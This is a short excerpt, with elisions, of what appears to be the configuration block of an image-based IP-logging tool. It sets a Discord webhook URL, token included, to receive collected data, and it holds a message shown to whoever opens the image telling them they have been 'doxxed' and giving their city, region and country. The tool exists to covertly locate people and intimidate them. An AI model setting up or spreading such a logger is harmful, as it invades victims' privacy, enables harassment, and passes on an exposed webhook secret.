...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1087096817709240450/ESS-fnLQbert_1XKxF8eQn_wMWFOZIUDuD-RMsDaXupd3Jigit3I6ue_vtEKs2BcOAXX", # Set the webhook in here
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "You've been doxxed by Ordinary. Your current address is: {city}, {region}, {country}.", # Message to show
